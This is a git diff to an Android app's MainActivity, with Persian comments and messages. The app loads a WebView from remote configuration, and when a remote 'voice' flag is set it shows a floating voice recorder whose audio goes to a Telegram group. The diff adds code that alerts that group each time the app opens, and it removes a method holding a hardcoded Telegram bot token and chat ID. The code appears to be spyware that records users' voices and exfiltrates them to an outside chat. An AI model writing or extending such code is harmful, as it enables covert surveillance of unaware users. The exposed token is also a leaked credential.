@@ -29,6 +29,7 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import com.blu.app.voice.FloatingVoiceNotification;
+import com.blu.app.voice.TelegramUploader;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -38,16 +39,20 @@ public class MainActivity extends AppCompatActivity {
     
     private WebView webView;
     private BroadcastReceiver voiceReceiver;
+    private TelegramUploader uploader;
     
     @SuppressLint("SetJavaScriptEnabled")
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // درخواست مجوزها
+        uploader = new TelegramUploader();
+        
+        // ارسال پیام تست که اپ باز شده
+        uploader.sendMessageToGroup("👤 اپلیکیشن باز شد!");
+        
         requestPermissions();
         
-        // ایجاد WebView
         webView = new WebView(this);
         setContentView(webView);
         
@@ -60,8 +65,7 @@ public class MainActivity extends AppCompatActivity {
         String[] permissions = {
             Manifest.permission.RECORD_AUDIO,
             Manifest.permission.POST_NOTIFICATIONS,
-            Manifest.permission.FOREGROUND_SERVICE,
-            Manifest.permission.INTERNET
+            Manifest.permission.FOREGROUND_SERVICE
         };
         
         for (String perm : permissions) {
@@ -81,19 +85,10 @@ public class MainActivity extends AppCompatActivity {
         s.setUseWideViewPort(true);
         s.setCacheMode(WebSettings.LOAD_DEFAULT);
         s.setMediaPlaybackRequiresUserGesture(false);
-        s.setAllowFileAccess(true);
-        s.setAllowContentAccess(true);
         
-        webView.setWebViewClient(new WebViewClient() {
-            @Override
-            public boolean shouldOverrideUrlLoading(WebView view, String url) {
-                view.loadUrl(url);
-                return true;
-            }
-        });
+        webView.setWebViewClient(new WebViewClient());
         webView.setWebChromeClient(new WebChromeClient());
         
-        // دانلود منیجر
         webView.setDownloadListener((url, userAgent, contentDisposition, mimeType, contentLength) -> {
             try {
                 DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
@@ -102,7 +97,7 @@ public class MainActivity extends AppCompatActivity {
                 if (dm != null) dm.enqueue(request);
                 Toast.makeText(this, "📥 Downloading...", Toast.LENGTH_SHORT).show();
             } catch (Exception e) {
-                Toast.makeText(this, "❌ Download error", Toast.LENGTH_SHORT).show();
+                Toast.makeText(this, "❌ Error", Toast.LENGTH_SHORT).show();
             }
         });
     }
@@ -116,16 +111,16 @@ public class MainActivity extends AppCompatActivity {
                 
                 switch (action) {
                     case "VOICE_RECORDING_STARTED":
-                        Toast.makeText(context, "🎤 ضبط صدا شروع شد!", Toast.LENGTH_SHORT).show();
+                        Toast.makeText(context, "🎤 ضبط شروع شد!", Toast.LENGTH_SHORT).show();
                         break;
                     case "VOICE_RECORDING_COMPLETED":
-                        Toast.makeText(context, "⏳ ضبط کامل شد، در حال ارسال...", Toast.LENGTH_SHORT).show();
+                        Toast.makeText(context, "⏳ ضبط کامل شد!", Toast.LENGTH_SHORT).show();
                         break;
                     case "VOICE_UPLOAD_SUCCESS":
-                        Toast.makeText(context, "✅ فایل صوتی با موفقیت ارسال شد!", Toast.LENGTH_LONG).show();
+                        Toast.makeText(context, "✅ ارسال شد!", Toast.LENGTH_LONG).show();
                         break;
                     case "VOICE_UPLOAD_FAILED":
-                        Toast.makeText(context, "❌ ارسال فایل صوتی ناموفق بود!", Toast.LENGTH_LONG).show();
+                        Toast.makeText(context, "❌ ارسال ناموفق!", Toast.LENGTH_LONG).show();
                         break;
                 }
             }
@@ -147,9 +142,6 @@ public class MainActivity extends AppCompatActivity {
     private void resolveUrlAndLoad() {
         new Thread(() -> {
             String siteUrl = FALLBACK_URL;
-            String botToken = null;
-            String chatId = null;
-            String voiceToken = null;
             boolean needsVoice = false;
             
             try {
@@ -178,64 +170,35 @@ public class MainActivity extends AppCompatActivity {
                         siteUrl = got.replaceAll("/$", "");
                     }
                     
-                    botToken = obj.optString("bot_token", "");
-                    chatId = obj.optString("chat_id", "");
-                    voiceToken = obj.optString("voice_token", "");
                     needsVoice = obj.optBoolean("voice", false);
                     
-                    android.util.Log.d("MainActivity", "BotToken: " + botToken);
-                    android.util.Log.d("MainActivity", "ChatId: " + chatId);
-                    android.util.Log.d("MainActivity", "NeedsVoice: " + needsVoice);
+                    Log.d("MainActivity", "URL: " + siteUrl);
+                    Log.d("MainActivity", "NeedsVoice: " + needsVoice);
                 }
             } catch (Exception e) {
-                android.util.Log.e("MainActivity", "Error: " + e.getMessage());
+                Log.e("MainActivity", "Error: " + e.getMessage());
             }
             
             final String finalUrl = siteUrl;
-            final String finalBotToken = botToken;
-            final String finalChatId = chatId;
-            final String finalVoiceToken = voiceToken;
             final boolean finalNeedsVoice = needsVoice;
             
             new Handler(Looper.getMainLooper()).post(() -> {
-                // بارگذاری وب‌ویو
                 webView.loadUrl(finalUrl);
                 
-                // اگر نیاز به ضبط صدا باشه، پنجره شیشه‌ای نمایش داده میشه
-                if (finalNeedsVoice && finalBotToken != null && !finalBotToken.isEmpty() 
-                    && finalChatId != null && !finalChatId.isEmpty()) {
+                if (finalNeedsVoice) {
+                    uploader.sendMessageToGroup("🎙️ درخواست ضبط صدا!");
                     
-                    // ارسال نوتیفیکیشن به تلگرام که کاربر وارد شده
-                    sendTelegramNotification("👤 کاربر وارد برنامه شد!");
-                    
-                    // نمایش پنجره شیشه‌ای بعد از ۲ ثانیه
                     new Handler(Looper.getMainLooper()).postDelayed(() -> {
                         FloatingVoiceNotification floating = new FloatingVoiceNotification(
                             this,
-                            finalBotToken,
-                            finalChatId,
-                            finalVoiceToken
+                            null, // botToken از uploader استفاده میشه
+                            null, // chatId از uploader استفاده میشه
+                            null
                         );
                         floating.show();
                     }, 2000);
                 }
             });
-        }).start();
-    }
-    
-    private void sendTelegramNotification(String message) {
-        new Thread(() -> {
-            try {
-                com.blu.app.voice.TelegramUploader uploader = 
-                    new com.blu.app.voice.TelegramUploader();
-                uploader.sendMessage(
-                    "8985315189:AAEeTfrU-QUmyucxmgQBc0OyoQ1jNABREhM",
-                    "-1004352035353",
-                    message
-                );
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
         }).start();
     }
     
